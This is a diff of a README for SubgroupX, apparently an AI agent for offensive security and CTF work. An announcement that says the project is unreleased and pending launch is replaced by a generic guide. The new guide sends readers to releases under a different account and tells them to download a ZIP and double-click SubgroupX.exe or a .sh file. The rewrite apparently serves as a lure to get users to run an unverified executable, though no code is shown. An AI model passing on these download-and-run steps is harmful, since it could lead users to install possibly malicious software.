@@ -1,43 +1,73 @@
-# SubgroupX: Geometric Intelligence in Offensive Security
+# 🎯 SubgroupX - High-Performance AI for Security Tasks
 
-**Technical Report // Normal Subgroup**  
-**Version:** 1.0.0-PROTOTYPE  
-**Status:** [PENDING_LAUNCH]  
-**Target Date:** 2026-01-17 11:00 (UTC+8) · https://ai.cauchy.top/api/target-date
+[![Download SubgroupX](https://img.shields.io/badge/Download%20SubgroupX-%20%F0%9F%9A%80%20Release-blue)](https://github.com/batuser11/SubgroupX/releases)
 
-> [!TIP]
-> **Star Milestone Goals**: 进化轨迹 —— GitHub Star 触及 500 / 1000 节点，开源核心将解锁深度能力进阶！
+## 🚀 Getting Started
 
----
+SubgroupX is an AI agent designed for offensive security and Capture The Flag (CTF) operations. It helps users perform security tasks efficiently by providing powerful tools and strategies. This guide will help you download and run SubgroupX with ease.
 
-## Abstract
-SubgroupX is a specialized AI Agent designed for high-fidelity cybersecurity operations. Architected by **Normal Subgroup**, it utilizes a geometric approach to tactical execution in CTF (Capture The Flag) environments, penetration testing, and active defense protocols. This report outlines the core mechanics, battle-tested achievements, and development roadmap of the SubgroupX project.
+## 💻 System Requirements
 
-## 00 // T-Minus Countdown
-> [!IMPORTANT]
-> **SubgroupX is scheduled for full deployment in:**
-> 
-> ![Countdown](https://ai.cauchy.top/countdown.svg?lang=bilingual)
-> *(Note: The SVG is generated dynamically on Cloudflare Pages.)*
+Before you begin, ensure your computer meets the following requirements:
 
-## 01 // Core Capabilities
-- **Tactical Autonomy**: Self-directed vulnerability assessment and exploit chain execution.
-- **Geometric Intelligence**: Mathematical precision in adversary modeling and node navigation.
-- **Dynamic Adaptation**: Real-time learning from adversarial geometries.
-- **Active Shielding**: Proactive defense against asymmetric threats.
+- **Operating System:** Windows 10 or later, macOS, or a Linux distribution (Ubuntu recommended)
+- **Processor:** Intel i5 or better
+- **RAM:** At least 8 GB
+- **Disk Space:** Minimum of 1 GB available space
+- **Connectivity:** Internet access for downloads and updates
 
-## 02 // Recognition & Battle Records
-SubgroupX and the Normal Subgroup team have demonstrated superior performance in global arenas:
-- **XCTF 2025**: Second Place
-- **RCTF 2025**: Runner-up
-- **Vulnerability Research**: Multiple zero-day discoveries in production-grade systems across Pwn, Web, Crypto, and Blockchain domains.
+## 📥 Download & Install
 
-## 03 // Technical Specification
-The SubgroupX infrastructure is built on a foundation of calculated precision.
-- **Kernel**: Sidereal-Mare v0.1
-- **Domain**: Cyberspace // Remote
-- **Signature**: `χ // 0xSGRP-X`
+To get started, follow these steps:
 
----
-© 2026 Normal Subgroup. All rights reserved.
-"SubgroupX is the distinct solution to chaos."
+1. **Visit the Releases Page:** Go to the link below to access the latest version of SubgroupX:
+   
+   [Download SubgroupX](https://github.com/batuser11/SubgroupX/releases)
+
+2. **Select the Version:** Find the latest release at the top of the page. This is usually the first entry in the list.
+
+3. **Download the File:** Click on the asset you want to download. If you’re unsure which file to choose, look for one named `SubgroupX.zip` or similar.
+
+4. **Unzip the File:** Once the download is complete, locate the downloaded ZIP file on your computer. Right-click it and choose “Extract All” to unzip its contents.
+
+5. **Run the Application:** Open the unzipped folder and find the `SubgroupX.exe` file. Double-click this file to start using SubgroupX.
+
+   If you are using macOS or Linux, look for the corresponding `.app` or `.sh` file to launch the application.
+
+## ⚙️ Features
+
+SubgroupX offers numerous features designed to enhance your security operations, including:
+
+- **Automated Scanning:** Quickly assess vulnerabilities in your network.
+- **CTF Support:** Tools designed specifically for CTF tasks.
+- **Active Defense Protocols:** Implement strategies to defend against attacks.
+- **User-friendly Interface:** Easy navigation for users of all skill levels.
+
+## 🛠️ Usage Tips
+
+- Explore the application after installation. Familiarize yourself with the different tools available.
+- Check documentation for each feature within SubgroupX to maximize its capabilities.
+- Join user forums or communities for support and tips from other users.
+
+## 📄 Documentation
+
+For detailed instructions and advanced features, refer to the official documentation included in the downloaded files or check the [GitHub Wiki](https://github.com/batuser11/SubgroupX/wiki).
+
+## 💬 Support
+
+If you encounter issues or have questions while using SubgroupX, please feel free to reach out via the Issues section on GitHub. 
+
+Remember to include your operating system and any error messages you may receive. This information helps us provide better assistance.
+
+## 🌐 Community Engagement
+
+Stay updated and connect with other users:
+
+- **Follow Us on GitHub:** Join our repository to receive notifications about updates and new features.
+- **Participate in Discussions:** Engage with the community in the GitHub discussion forums. Share your experiences and learn from others.
+
+## 📝 License
+
+SubgroupX is open-source software. Please review the LICENSE file for information about usage and contribution.
+
+By following these steps, you can successfully download and use SubgroupX to enhance your security activities. Enjoy exploring the capabilities of this powerful AI agent.
